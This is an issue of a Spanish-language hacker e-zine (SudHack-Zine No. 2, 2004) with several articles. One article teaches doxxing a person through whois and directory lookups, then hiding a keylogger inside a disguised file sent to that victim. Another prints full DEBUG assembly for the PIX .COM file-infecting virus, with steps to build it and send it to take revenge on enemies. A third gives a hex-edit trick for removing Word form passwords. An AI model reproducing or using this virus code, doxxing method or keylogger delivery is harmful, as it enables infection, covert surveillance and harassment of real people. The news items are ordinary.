
                                                                                 11/3/2004

*****************************************************************************************

                                 ###  # #  ##   # #  ###  ### #  #  
                                #    # #  # #  # #  # #  #   # #      
                               ###  # #  # #  ###  ###  #   ##      
                                #  # #  # #  # #  # #  #   # #     
                             ###  ###  ##   # #  # #  ### #  #  Zine 
                                                 Tu comunidad Habla Hispana de Hackers
*****************************************************************************************

 NOTA: SudHack, NI NINGUNO DE SUS REPRESENTANTES, PARTICIPANTES NI ESCRITORES, SE HACEN
 RESPONSABLES DEL MAL USO QUE SE LE PUEDA DAR A LA INFORMACIÓN PUBLICADA EN ESTE E-ZINE
 TODOS LOS DOCUMENTOS SON DE INFORMACIÓN Y NO PARA OCASIONAR DAÑOS.
*****************************************************************************************

Web oficial:
¯¯¯¯¯¯¯¯¯¯¯        http://SudHack.cjb.net
Web de la revista:
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯  http://SudHack-zine.cjb.net
Mail oficial de colaboradores:
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯      
                    sudhack@sudhack.zzn.com
el-guru                   >>el-guru@sudhack.zzn.com
rocko                     >>rocko@sudhack.zzn.com
AliretH_K                 >>alk@sudhack.zzn.com
Keogh                     >>keogh@novahack.com
E.I				  >>cky_243@hotmail.com

Mail de la revista:
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯ e-zine@sudhack.zzn.com
Foro oficial:
¯¯¯¯¯¯¯¯¯¯¯¯       http://sudhack.foro.st 

mIRC:
¯¯¯¯			 http://SudHack.ya.st
						*irc.elsitio.com
						*6667
						*#SudHack 



NOTA 2.
¯¯¯¯¯¯
      Como esta comunidad se encuentra representada por personas de distintas partes del mundo
me he tomado el atrevimiento de modificar algunos de los textos, para que puedan ser entendidos
por personas de cualquier parte del mundo. Lo modificado serán algunos términos y no la idea
del texto, o la idea en si.




	               			<----------->
			               	   INDICE
		               		<----------->



01>> EDITORIAL 		                      ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY SudHack

02>> TRUCOS HACK                              ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY AliretH_K

03>> ESPIONAJE INFORMÁTICO                    ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY AliretH_K
		
04>> BUG EN PROTECCIÓN DE WORD                ->>>>>>>>>>>>>>>>>>>>>>>>>>>          By DonGato	

05>> UN VIRUS                                 ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY el-guru

06>> ACTUALIDAD                               ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY AliretH_K

07>> COMPILADO                                ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY el-guru 

08>> FALLO EN WIN ME  		                ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY AliretH_K

09>> Hacking de Sistemas Windows 2000 a través de IPC->>>>>>>>>>>>>>>>>>>>>>>>>>>   By DonGato
			 
10>> Carpetas autoejecutables en Windows XP   ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY DonGatø 	
	
11>> TRUCOS WINDOWS  98                       ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY E.I

12>> DESPEDIDA                                ->>>>>>>>>>>>>>>>>>>>>>>>>>>          BY SudHack

 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



***********************
-----------------------
EDITORIAL
-----------------------
                   SudHack
***********************

Holaaaaa hackers del mundooooo!!!!
Increíble que hallamos llegado, SISISIS el segundo número de 
SudHack-Zine (SHT)
Espero que les halla  gustado muchísimo el  primer número de 
la revista, además esta va a ser mejor. 
Les tengo que pedir perdon, se nos atrasó un poco la revista
ya que teniamos la cabeza en otra cosa y cuando nos dimos
cuenta el tiempo nos estaba acorralando. Así que por favor
sepan disculparnos.
No iba a bajar la calidad nada mas porque
la revista no esta lista y le hace falta textos.
Estoy  muy  contento  de  como  repercutió 
SudHack  en la  gente, en los  newbie que nos visitan y como 
repercutió la  e-zine :)  así que muchas gracias por visitar 
nuestras web´s y por ayudarnos a crecer cada día mas.

Hemos leído  y releído todos  los  textos para que no tengan 
faltas de ortografía, ya que hay alguna que otra persona, que
me ha molestado mucho con eso.
No  queremos  que tenga  expresiones que no las entiendan en 
otros países, esta zine  será puro español :P y toda para el 
mundo :D y tratando de que  sea con el mejor español posible
Agradezo que me halla colonizado España y no Inglaterra :D

También como verán, arreglamos un poco mas los pafarros, si 
bien todavia  no  los  tenemos  todos totalmente derechos y 
alineados perfectamente tratamos de  organizarlo mejor para
así poderlo visualizar mejor en cualquier editor de  texto.

No quiero  dejar  de acordarme  de algunas web´s que nos han 
apollado y ayudado, yo se que seria muy cruel mensionarlas 
en este momento, ya que,  el apoyo  fue muy grande,  y seria
muy comun y seguro olvidarme de algunos de ellos.

Disfruten de la e-zine...


¡¡¡¡¡¡¡¡¡¡SudHack-zine N° 2!!!!!!!!!!!!      


¡¡¡¡¡NO OLVIDES VISITAR!!!!!


HTTP://SudHack.CjB.Net

HTTP://WWW.NOVAHACK.COM

HTTP://WWW.AMD-HACK.COM.AR




***********************
-----------------------
TRUCOS HACK
-----------------------
                  AliretH_K
***********************

Holassss...!!!
Cómo  están todos, espero que bien, espero que esta sección 
les halla  gustado, y si no  es así,  ya pueden pasarla por 
alto.
Como se darán  cuenta  esta sección no  tiene nada de hack, 
pero está buena  leerla para mantenerse al tanto de algunas 
cosas  buenas  y  que  pueden ser de gran ayuda si en algún 
momento de nuestras vidas. 
Bueno, para no entrar en detalles ni perder tiempo, vamos a 
ir al truco de del día.
....

                        ..::RESTAURAR SISTEMA::..

Si vos tenés windows ME, y tenés algo que no te guste, o te
entro  algún  virus  o algun  archivo  con  el  cual tienes 
problemas  en tu pc,  existe  una  forma  de  restaurar  el 
sistema, es algo realmente sencillo, aunque solo sirve nada 
mas que para algunos días atrás.

Tenés  que  colocar  tu  disco de inicio en la disquetera y 
teclear "SCANREG/RESTORE" (sin comillas) (desde ms-dos). 
Pero como  siempre existen  personas que no tienen disco de 
inicio (MUY MALLLL) hay una opción para hacerlo desde win.
Andá a:
>>INICIO
    >>PROGRAMAS
          >>ACCESORIOS
                  >>HERRAMIENTAS DEL SISTEMA
                                        >>RESTAURAR SISTEMA

Bueno, como verán, este truco, no es muy bueno, pero espero 
que les halla gustado.
Espero que siga en el próximo número. :S 
:'(
                              

                                                                                  
***********************
-----------------------
ESPIONAJE INFORMÁTICO
-----------------------
                  AliretH_K
***********************

Bueno, voy a ser sincero con ustedes, este texto, lo estaba 
guardando  para  un libro  que  voy  a terminar de escribir 
dentro de muy poco, pero  no  quiero  que  por culpa mia la 
e-zine se  vuelva mas pobre (en sentidos de textos) así que 
decidi tomar un texto de mi proximo libro (Libro de oro del 
hacking Argentino) y colocarlo aca, espero que les guste ;)



ESPIONAJE INFORMÁTICO
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
ESTE PASO  ES  MUY  IMPORTANTE DENTRO DEL HACKING YA QUE ES 
UNA  DE  LAS  PRIMERAS  COSAS, QUE TODOS LOS  HACKERS DEBEN 
SABER.
ESTOS MÉTODOS SON (NO TODOS) LIBRES,  NINGUNO SE  ENCUENTRA
FUERA DE  LA  JUSTICIA,  PERO  SON  MUY EFICIENTES, Y PUEDO 
ASEGURAR, QUE MAS DE UNO QUE  LE DES ESTA INFORMACIÓN SE VA 
A  ASUSTAR,  DE  TUS  GRANDES  ACTIVIDADES  Y CONOCIMIENTOS
BIENVENIDO, AL VERDADERO ESPIONAJE INFORMÁTICO!!!

*DOMINIOS WEB

Cuando uno posee  un  sitio web, debe registrarse  al hacer 
esto deja muchos datos  sobre  el, para afimar que su sitio 
es  de  el  y pagar  el hostin y  los servicios, seria como 
tener una casa, uno tiene que colocarla a nombre de alguien 
y pagar impuestos.
Nadie se  librará  de  colocar estos datos, al menos que se 
haga un gran trabajo, logístico y arriesgado.
Supongamos  que  nosotros tenemos dos amigos, y cada uno de 
ellos posee un sitio web en Internet.
Nuestro  primer  amigo,  tiene  una  web,  que  su  URL  es 
www.estudio-petersen.com.ar 
y  nuestro  segundo  amigo,  posee  un  sitio Internacional
www.hackers.com
Ahora, nosotros queremos conocer mas a 
www.estudio-petersen.com.ar
Lo primero, y que es  algo obvio, nos dirigimos  a su web y 
nos daremos cuenta que se llama Gustavo Petersen.
ok, ya sabemos algo.
Como había dicho, todos nos tenemos que  registrar para una
web .com, o .com.ar, y en algun  lugar  quedan  almacenados
estos datos, OK, ese lugar es NIC.
Las  siglas  NIC  quiere  decir  Network Information Center

Las  web  de  NIC, son  muy  fáciles, de recordar y siempre 
fáciles de saber la url para  sitios de paises es igual que 
una extencion internet, pero sin .com
ARGENTINA www.nic.ar
VENEZUELA www.nic.ve
CHILE www.nic.cl
y así susesibamente.
OK, vamos a la web, desde allí, vamos a consultas on-line y 
colocamos dentro del cuadro de díalogo
estudio-petersen.com.ar
Y nos empieza a tirar un monton de datos.... a mas no poder
WWWWWOooooooWWWW,  eso  no  es  todo,  supongamos que ahora 
queremos saber cual es el nombre de los vecinos :|
En  Argentina una guía llamada Páginas Doradas, pertenece a 
Telefonica (creo) esta,  posee un programa, que te datos de 
las  personas,  pero  no  todos  tienen ese programa, no os 
preocupeis :p vamos a:
www.paginasdoradas.com.ar
Y ellos nos brindan el servicio on-line y lo de ahora ya es 
mas pensar, podriamos colocar el la altura de la numeración
para  saber como se  llama  el vecino,  o  si  vive  en  un 
edificio,  poniendo  la  direccion  (sin el piso)  podremos 
saber  como  se  llaman todas las personas que viven en ese 
edificio ademas, al  colocar  su  dirección, sabremos si la
casa se encuentra a su nombre o no :|.
Muy bien, ahora que ya tenemos vastante información, pasemos 
a nuestro otro amigo,
www.hackers.com
Los pasos van a ir siendo los mismo, recuerdan esa super web
NIC
Pero ahora como  el dominio es internacional, tenemos que ir 
a:
www.nic.com
Y eligiremos, el link de whois.
colocamos, HACKERS.COM y otra vez, nos  empieza  a abarrotar 
de información. :D  y  se  puede hacer lo mismo, rastrear el 
teléfono, de las distintas  bases  de datos,  que existen en 
cada país.


*PERSONAS EN PARTICULAR

Este  sistema  es  algo  mas  dificil, de  realizar, ya  que 
rastrear a una  persona, con  solo  tener  el  nombre  puede 
resultarnos, en muchas ocasiones  IMPOSIBLE pero no  hay que 
dejar  de  lado,  que  el  procedimiento  es  realmente  muy 
sencillo.
Al crear un correo electrónico, el 80% de las personas ponen 
sus datos reales en cuestion de nombre y apellido.
por ej.
estudiop@hotmail.com
DE: Gustavo Petersen
PARA: Diego Maradona <dm@elmejor.com>

Con  este  ejemplo tonto, quiero demostrar en la  gente pone 
sus datos REALES :|, si, existe gente tan tonta.
URL´s:
http://www.spanish.whowhere.com      Español       
http://www.whowhere.com              Ingles    
http://www.four11.com                Ingles  
http://www.lookup.com                Español  

Estas  son las famosas bases de datos de las que les hablaba
Con solo colocar, es  país de la persona y  el nombre, estas 
web´s, te empiezan a tirar, los mail´s de las personas.
Y con el mail, y ya sabemos  el nombre, podemos realizar mas 
espionaje, como el mensionado anteriormente.
Otra  forma  que pudiésemos  utilizar al tener la IP de  una 
persona, conectada a Internet, es usar el comando 
TRACERT

C:\>tracert

Uso: tracert [-d] [-h máximo_de_saltos] [-j lista_de_hosts] [-w tiempo_de_espera
] nombre_de_destino

Opciones:
    -d                   No convierte direcciones en nombres de hosts.
    -h máximo_de_saltos  Máxima cantidad de saltos en la búsqueda del objetivo.
    -j lista-de-hosts    Enrutamiento relajado de origen en la lista de hosts.
    -w tiempo_de_espera  Tiempo en milisegundos entre intentos.

Este comando sigue la traza de trasnferencia de un IP
con esto, pudiésemos saber (hay que romperse la cabeza)
cuales son los sitios de su interés y con los cuales interactua
mayor tiempo.


Ahora que ya sabemos algo, acerca de como encontrar 
información de otra persona, y de como obtener sus correos
electrónicos.
Ahora, tendriamos que pasar a realizar lo ILEGAL Tendremos 
que utilizar una clase de programa.
JOINER
Y los demas quedan a nuestra elección
Keylogger
o Sniffer, o sino, por que mejor los ambos :D  La clase de
programas, llamado  JOINER  es  un  tipo de  programas que 
esconde, o une, la  extención .EXE  escondiendola en  otro 
tipo de extención .BMP .TXT o cualquier tipo de extención.
Supongamos que elegimos un Keylogger y lo unimos con otro, 
escondiendo la extención, y lo mandamos, como un pedido de 
algo (si conocemos a la persona y sabemos a que se dedica, 
le  mandamos  algo  que le interese)  en  formato .DOC, al 
ejecutarlo obviamente se le ejecutara el Keylogger, que te 
enviará las teclas presionadas  a  tu  correo electrónico.
También podemos hacer lo mismo con  algún  tipo de sniffer
unirlo  y  esconderlo  en  otra  extención  y así, hacerlo 
ejecutar en la PC víctima.
Tal  vez escribiendo  algun tipo de correo con algun link, 
podriamos falsificar la URL, o tal vez utilizar algun otro
bug y hacer descargar el programa  sin  que  la víctima lo 
supiese, eso sería para hacerlo mas creible, ya  que  como 
dato  adjunto  puede  ser  eliminado,  pero  mientras  les 
mandemos cosas que a el le interese.
Por ejemplo si trabaja de algo, podemos enviarle un pedido
para que nos haga algun trabajo, eso lo va a abrir si o sí
y ahi se ejecuta el programa. :D
Como verán las partes en que son utilizados  los programas
pierde la  gracia  Hacker,  ya  que  lo  hacen  todos  los 
programas pero también esta bueno.
Esta sería la parte "Ilegal" ya  que estaríamos invadiendo 
la privacidad, pero como espionaje es excelente.
Realizando esto último, sacariamos datos muy valiosos.
NOMBRES
PASSWORD
INTERESES
NUMEROS DE TELEFONOS
TRABAJOS
Podriamos realizar un excelente  espionaje, aunque  lo que 
explique antes, no esta mal, no creen. ;)

Supongamos que la persona no tiene conección a Internet en
este caso sería casi imposible.
¿Donde atacamos?
¿A quien perseguimos?
En ese caso hay que sniffear a la empresa en donde trabaja
pero  no  se  puede  sacar  gran  provecho,  a   lo   sumo 
conseguirás algún nombre, pero nada mas.



Espero que este texto les alla gustado :D y si así es este 
texto, imaginense como será el libro que voy a sacar :|
PD:  Por  eso mismo es que mis textos anteriores no fueron 
tan buenos, solamente ocupaba espacio para rellenar lo que 
faltaba ya que estaba ocupado escribiendo el libro.




**************************
--------------------------
BUG EN PROTECCIÓN DE WORD
--------------------------
                     DonGato
**************************


Microsoft Word provee una opción para proteger formularios
con una clave. 
Esto se usa  para asegurar que  usuarios no autorizados no 
puedan manipular los  contenidos de los documentos excepto 
dentro de áreas de "formulario"  especialmente designadas. 
Esta  característica   también  se   usa   para   proteger 
documentos que no tienen áreas de formulario.


Los usuarios de Microsoft Word  encontrarán esta opción en 
el menú de Herramientas / Proteger Documentos y luego 
seleccionando "Formularios" e ingresando una clave.

Si un documento de Word está protegido por este mecanismo,
los  usuarios  no  podrán  seleccionar partes  del texto o 
ubicar el cursor dentro del mismo, por lo tanto  no podrán 
efectuar cambios en el documento.

Esta protección de formulario se puede remover  fácilmente 
sin  ninguna  herramienta  adicional  mas  que  un  editor 
hexadecimal.

Descripción:

Al guardar un documento  protegido de Word como html, Word 
agrega  un  "checksum"  (suma de chequeo)  de  la clave al 
código. 
El formato del checksum  se ve como CRC32 pero actualmente 
no hay mas detalles disponibles.  Este  checksum  se puede 
encontrar  dentro  de  el   documento  original  de   Word 
abriéndolo con un editor hexadecimal.  Si este checksum es 
reemplazado por 0x00000000  la clave  equivale a un string 
(cadena) vacío.

Ejemplo: 
Abra un documento protegido en MS Word 
Guárdelo como Página web (*.htm ó *.html) y cierre Word 
Abra el documento html en un  editor  de  texto  (bloc  de 
notas, por ejemplo) 
Buscar "<w:UnprotectPassword>", en  la línea se leerá algo 
como:

<w:UnprotectPassword>ABCDEF01</w:UnprotectPassword>

Memorice el password (clave) 
Abra el documento original (doc) con un editor hexadecimal 
Busque  los  valores  hexadecimales  de  la  clave  (orden 
inverso) 
Sobrescriba todos los cuatro bytes dobles con 0x00, guarde
y cierre.
Abra el documento con MS Word,  seleccione  Herramientas / 
Desproteger documento (clave en blanco) 

Variación:

Si  los  ocho  bytes  de  checksum  se  reemplazan  con el 
checksum de una clave conocida sería muy fácil desproteger
el documento, haga todos los  cambios  necesarios, guarde, 
cierre  y  restablezca  la  clave  a  su  valor   original 
(desconocido), solo restaurando los valores originales. 
El documento fue cambiado sin siquiera conocer la clave.


Nota VSA: En nuestras  pruebas, el procedimiento parece no 
funcionar en todas las versiones de Word.






***********************
-----------------------
UN VIRUS
-----------------------
                  el-guru
***********************



En este pequeño lugar del E-Zine quiero explicar lo que es
un virus así de como  se  constituye y como un virus sigue 
siendo  un  programa, tambien como  evitar  infectarse por 
E-Mail...  principalmente en  Hotmail que tu mail  siempre 
esta expuesto ahí por las famosas cadenas.

 Basico:

 Antes de empezar a  soltar  el  rollo  voy  a  hacer, unas 
 pequeñas  definiciones sobre el mundo de los virus, es mas
 que nada  para los que no tengan idea de casi nada de este 
 mundo.

• VIRUS: Es  un  pequeño  programa  generalmente escrito en 
         cualquier tipo de lenguaje 
         (desde Visual Basic - hasta Esamblador), y  sabras 
         que un Virus es un simple programa.


• Troyano:  Es un programa legal (en apariencia) que lleva 
            en su interior un codigo dañino en cuestion, a
            diferencia de un virus  este no se autoreplica 
            solo se ejecuta  una  vez  (y ya es suficiente 
            para que acabe con  tu  disco  ó  de  acceso a 
            gente agena por puertos  que el Troyano habré, 
            Por el momento uno de  los  mas  famosos y que
            recomiendo ampliamente usar es el LiTTleWitCH.
 

• Gusano ó Worm: Es  un  programa  que se  desplaza por la 
		     memoria del ordenador (RAM), busca  zonas  
                 de memoria desocupadas en las que realiza 
                 copias  repetidas   hasta   provocar   un 
                 desbordamiento   de   memoria   se   usan 
                 mayoritariamente en redes, uno de los mas 
                 famosos  por el momento es el BLASTER.


• Bomba Lógica: Es  un  pequeño  programa  que  permanece, 
                oculto y ni se autoduplica  ni se desplaza 
                en  memoria,  tan solo espera a que llegue 
                una  fecha  determinada  o   que   alguien 
                ejecute una  orden y entonces se activa el 
                proceso desmadrador!!!.
               
 Bien  es  hora  de  pasar  a lo que realmente interesa el 
 principio  de  un  virus.  Solo se necesita saber algo de 
 programacion, y ganas de  aprender ya vereis que al final 
 no es tan dificil  hacer un virus  simple  y  a partir de 
 ahi mejorarlo.

 ¿Como actua un Virus?

• Busca un fichero para infectar (*.exe, *.com etc...)
• Lo abre y comprueba el tipo de fichero, tamaño y si esta
  infectado.
• Si esta infectado, lo cierra y busca otro
• En el punto anterior si no esta infectado lo infecta
• Y así sigue hasta que destroza las PC's.

 Llego la hora del ejemplo. Es un virus llamado PIX, quiza
 no es  muy famoso y  mucho  menos una maravilla de virus, 
 pero sirve de ejemplo.

          
!!!Nota: Si lo haces fichero *.COM con el DEBUG
         de Windows  el virus estara activo, asi que si lo
         ejecutas pues ¿que crees que pase?
        

NPIX.COM
A
JMP 0116
DB  90,49,56,00,2A,2E,43,4F,4D,00,4F,04,00,00,01,00,00,00,00,00
MOV AX,CS
ADD AX,1000
MOV ES,AX
INC BYTE PTR [0105] ; Incrementa el contador de generaciones.
MOV SI,0100
XOR DI,DI
MOV CX,014F
REPZ
MOVSB
MOV DX,025F
MOV AH,1A
INT 21       ;Se encarga de crear el DTA para los ficheros...
MOV DX,0106  ;con extension *.COM
MOV CX,0018
MOV AH,4E
INT 21
JB 019E
MOV DX,027D
MOV AX,3D02  ;Abre el fichero en modo lectura/escritura.
INT 21
MOV [0114],AX
MOV BX,AX
PUSH ES
POP DS
MOV DX,034F
MOV CX,FFFF
MOV AH,3F
INT 21
ADD AX,034F
CS:
MOV [0112],AX  ;A continuacion, la firma del virus:
dB 3E,81,3E
DB 52,03
DB 49,56
JZ 0188
XOR CX,CX
MOV DX,CX
CS:
MOV BX,[0114]
MOV AX,4200
INT 21       ;Desplaza el puntero.
JB 0188
MOV DX,0000
CS:
MOV CX,[0112]
CS:
MOV BX,[0114]
MOV AH,40
INT 21       ;Salva virus y programa contaminado.
CS:
MOV BX,[0112]
MOV AH,3E
INT 21      ;Cierra el fichero.
PUSH CS
POP DS
MOV AH,4F
MOV DX,025F
INT 21
JB 019E
JMP 013E
MOV DX,0080
MOV AH,1A
INT 21        ;Restaura el DTA original.
CMP BYTE PTR [0105],05 ; ¨Quinta verción?...
JB 0207       ; Si es asi, comienza el espectaculo.
MOV AX,0040
MOV DS,AX
MOV AX,[006C] ; Aleatoriedad de manifestacion del virus...
PUSH CS       ; mediante el registro de decimas de segundo.
POPDS
AND AX,0001
JZ 0207
MOV DX,01C4
MOV AH,09
INT 21
INT 20        ; A continuacion, el mensaje del virus.
DB 59,4F,55,52,20,50,43,20,48,41,56,45,20,41,20,4D,45,53,53,41,4A,52
DB 20,46,4F,52,20,59,4F,55,20,3A,20,4A,4F,44,45,54,45,20,59,20,45,53
DB 50,45,52,41,20,43,41,4D,49,4C,4F,20,4A,4F,53,45,20,43,45,4C,41,2E
DB 24
MOV SI,0224
MOV CX,002B
XOR DI,DI
REPZ
MOVSB
XOR DI,DI
CS:
MOV WORD PTR [010E],0000
CS:
MOV [0110],ES
CS:
JMP FAR [010E]
PUSH DS
POP ES
MOV SI,044F   ;el-guru sigue explicando xD~~
CMP BYTE PTR [0105],01
JNZ 0234
SUB SI,0200
MOV DI,0100
MOV CX,FFFF
SUB CX,SI
REPZ
MOVSB
CS:
MOV WORD PTR [0100],0100
CS:
MOV [0102],DS
CS:
JMP FAR [0100]  ; Salto a la ejecucion del verdadero programa...
INT 20          ; siempre que se trate de una generacion...
INT 20          ; posterior a la primera, y por tanto, exista.
DB 0,0

R CX
154
W
Q

!!!Nota:
 Este punto será de suma importancia ya que te diré como 
 activarlo,para vengarte de enemigos solo copia el texto 
 anterior  pero  quítal e los  ;opninion y copialo en un 
 archivo despues pasalo al Edit de Windows que esta en 
 C:\Windows\System32\edit.exe y ahi pasalo despues lo 
 guardas con extencion
 .com es decir VIRUS.COM ó PIX.COM HOTMAIL.COM, despues 
 habre MS-DOS de
 Windows y coloca: DEBUG y entres despues saldrá una Linea

- (donde colocas) DEBUG < c:\misarchivos\VIRUS.COM 
                   y Listo!!! a enviar





***********************
-----------------------
ACTUALIDAD
-----------------------
                   AliretH_K
***********************




*Filtraciones del código fuente de Windows NT y 2000 


Microsoft reconoce en una escueta nota de prensa estar 
investigando la publicación en Internet de porciones 
incompletas del código fuente de Windows NT y Windows 2000. 
En lo que a seguridad se refiere, la filtración de su código 
fuente podría facilitar la detección y explotación de nuevas
vulnerabilidades en Windows.

Lo que empezó como un rumor en algunos foros de Internet 
parece que se confirma con el paso de las horas, si bien 
aun no se ha hecho público ningún análisis riguroso que 
demuestre que realmente se trata de porciones del código 
fuente de Windows, a que módulos corresponderían, y las 
implicaciones en materia de seguridad que esta filtración 
podría ocasionar. 
Sin embargo, el hecho de que Microsoft trate el asunto de 
forma oficial, con declaraciones de portavoces y publicación 
de nota de prensa en su web, apuntan a la veracidad del incidente.

Los únicos detalles que se conocen por el momento es la 
circulación por varias redes P2P de un archivo comprimido 
de 203.84 Megabytes,"windows_2000_source_code.zip",  
conteniendo 660MB de código fuente, y que está difundiéndose 
a gran velocidad. También hemos constatado que el contenido 
de este archivo ya circula por otras redes y en diferentes 
formatos.

Aun es pronto para hacer valoraciones sobre las implicaciones 
reales que este incidente podría tener. A la falta de un análisis 
minucioso del código que circula, lo que podría llevar bastante 
tiempo, todo lo que se maneja son vagas hipótesis.




*Microsoft hackeada por hackers que ahora revelan sus secretos


Pasado el susto al esperar un ataque del temible virus informático 
"Mydoom.B", que al final no se produjo, Microsoft, el imperio de 
Bill Gates debió reconocer públicamente que una parte del código 
secreto de Windows NT y 2000 fue puesto ilegalmente en la red 
abriendo puertas que podrían ser utilizadas por los hackers para 
ingresar en las computadoras de sus usuarios, aunque Microsoft 
minimizó el inconveniente.

EL COMUNICADO
La empresa que lidera el multimillonario Bill Gates aceptó ayer 
que una parte de los códigos de sus sistemas Windows NT y 2000 
circula por la red lo que podría perjudicar a Microsoft al 
desnudar posibles debilidades en sus sistemas lo que permitiría 
crear virus más poderosos, además de posibilitar que se copien 
ilegalmente.

Además de estos peligros, quienes obtuvieran los códigos podrían 
ingresar en las computadoras que los utilizan, lo que aumenta 
a millones el número de posible víctimas.

En un comunicado dado a conocer con fecha del jueves, aclara 
que estos datos representan sólo una mínima porción de las millones 
de líneas usadas para crear sus productos.

En su comunicado, la empresa de Gates trató de llevar tranquilidad 
a sus usuarios asegurando que no se verán perjudicados por la 
intromisión.

EL SUSTO PASADO
Hace algo más de una semana, la aparición de un virus, el 
Mydoom.A, conmovió el mundo informático. Inutilizó cientos 
de miles de computadoras, incluyendo redes empresarias. 
Pasado el susto, se anunció que el Mydoom.B estaba listo 
para atacar Mycrosoft lo que puso en alerta a la empresa de 
Gates que ha hecho de la defensa del secreto de sus sistemas 
una política que terminó en la Justicia. Pero el ataque no 
se concretó.

El martes pasado, la compañía Panda Software informó de la 
aparición de "Doomjuice.A", un nuevo virus informático preparado 
para distribuirse como un "gusano de red" de forma peligrosa, 
ya que no es detectable ni visible al usuario a través del 
correo electrónico como otros virus, dado que se aprovecha de 
los puertos abiertos por "Mydoom.A" y "Mydoom.B".

Según las mismas fuentes, los autores de este nuevo virus pueden 
ser los mismos que los creadores de "Mydoom.A", un "gusano" 
que sigue causando infecciones en los sistemas informáticos.



*Nokia admite fallos de seguridad en teléfonos móviles con Bluetooth

Nokia ha admitido que varios de sus modelos de teléfonos 
móviles son vulnerables a ataques de "bluesnarfing", método 
por el cual alguien puede introducirse en nuestro móvil y 
copiar, ver o incluso modificar ciertas partes como la guía 
telefónica o el calendario, todo ello se realiza desde 
un dispositivo cercano sin alertar en ningún momento al 
propietario.

Bluetooth es un sistema de comunicaciones inalámbricas de 
corto alcance, su uso en todo tipo de dispositivos móviles 
empieza a ser generalizado (lo podemos encontrar integrado
en cualquier teléfono móvil de gama media). 

El uso convencional de esta tecnología es principalmente el 
intercambio de datos entre dispositivos cercanos (10 metros) 
evitándonos el uso de cables.
Su adopción nos está trayendo consigo un nuevo vocabulario 
de palabras muy sonoras tales como "bluesnarfing" 
(anteriormente mencionada) o "bluejacking", que consiste en 
el envío de mensajes anónimos a dispositivos cercanos(entiéndase 
como una nueva forma de bombardearnos con mensajes indeseados).

La confirmación de los problemas de seguridad por parte 
de Nokia llega tras hacerse público que el bluesnarfing 
afectaba gravemente a varios de sus modelos 
(Nokia 6310, 6310i, 8910 y 8910i) así como en menor 
medida a otros modelos de Sony Ericsson y Ericsson.

Uno de los problemas se centra en la posibilidad de 
que alguien de nuestro entorno cercano pueda acceder 
a la información contenida en nuestro dispositivo a 
pesar de que esté configurado en modo "invisible", para ello
existen ya varias herramientas en la red que permiten 
encontrar los dispositivos mediante el uso de fuerza bruta.

El problema más grave que afecta al Nokia 7650 y al 
6310i (este último sin confirmar por la compañía) y 
permitiría en envío de SMS y la navegación web de terceros 
terminales a través de los modelos afectados.

Por último el modelo Nokia 6310i permite un ataque de 
denegación de servicio mediante el envío de un mensaje 
bluetooth especialmente construido, lo que provocará el 
reinicio del terminal.

Nokia ha negado que vaya a arreglar estos problemas y 
aconseja a los usuarios de sus teléfonos la activación 
del modo "invisible" cuando se encuentren en lugares públicos.



*Un 90% de las aplicaciones web son inseguras

Según un estudio realizado durante los últimos cuatro 
años por WebCohort, tan solo un 10 por ciento de las 
aplicaciones web pueden considerarse seguras ante cualquier
tipo de ataque. 
En estos datos se incluyen sitios de comercio electrónico, 
banca online, B2B, sitios de administración, etc.

Los estudios realizados han concluido que al menos un 92% de las 
aplicaciones web eran vulnerables a algún tipo de ataque. Los 
problemas más comunes son las vulnerabilidades de cross-site 
scripting (80%), inyección SQL (62%) y falsificación de parámetros 
(60%). En las auditorías realizadas por Hispasec Sistemas también 
hemos podido comprobar como este tipo de problemas son más habituales 
de lo que cabría desear, lo que evidencia que la mayoría de las 
empresas no aseguran adecuadamente sus sitios web, aplicaciones y 
servidores contra cualquier tipo de intrusión.

La gravedad de estos problemas reside en como los ataques
se realizan contra la propia aplicación web, el uso de las 
defensas habituales como firewalls, detectores de intrusos, etc. 
en la mayoría de los casos se muestran ineficientes. 
Los atacantes podrán acceder a datos de usuarios, de la 
empresa, detener sitios web, modificar la información del 
sitio web, e incluso llegar a ejecutar comandos en el servidor 
sin ser detectado en ningún momento.

Ya en el 2001, Gartner Group anunció que el 75% de los 
ataques informáticos a través de Internet eran realizados a
través de las aplicaciones web. 
En la actualidad es fácil comprobar como persiste el mismo problema.



*Nueva vulnerabilidad en los Kernel Linux

Se acaban de publicar las versiones 2.4.25 y 2.6.3 del kernel Linux, 
que solucionan un grave problema de seguridad.

Las versiones previas del kernel contienen una vulnerabilidad 
en la función "do_mremap" que permite que cualquier usuario local 
obtenga privilegios arbitrarios o provoque la caída del sistema.

Todos los administradores de máquinas Linux deberían actualizar a los
kernels 2.4.25 o 2.6.3, especialmente si sus usuarios pueden ser
maliciosos. La versión 2.2.25 también es vulnerable pero, de momento, 
no se ha publicado ninguna actualización.

Recordamos nuevamente la conveniencia de descargar las actualizaciones
desde puntos de Internet confiables, para evitar el riesgo de caballos
de Troya o alteraciones maliciosas o defectuosas.



*Actualización para el reproductor Windows Media

Microsoft ha publicado una actualización que corrige algunos errores 
del comportamiento de las secuencias de comando URL de su conocido 
reproductor Windows Media.

Esta actualización viene a corregir unos problemas por los que un 
atacante podría agregar una secuencia de comandos en un archivo de 
sonido o vídeo con lo que conseguiría forzar a un usuario que intente 
ejecutar estos archivos a conectar con una página web determinada. 
Según fuentes de Microsoft este comportamiento es una característica 
de diseño.

Específicamente, la actualización modifica el Reproductor de Windows 
Media para que reconozca tres nuevos valores del Registro que permiten 
a un usuario o a un administrador controlar la situaciones en las que 
el reproductor ejecutará secuencias de comandos URL que se hallen 
incrustados.

Productos afectados:
Microsoft Windows Media Player 9 Series for Windows XP
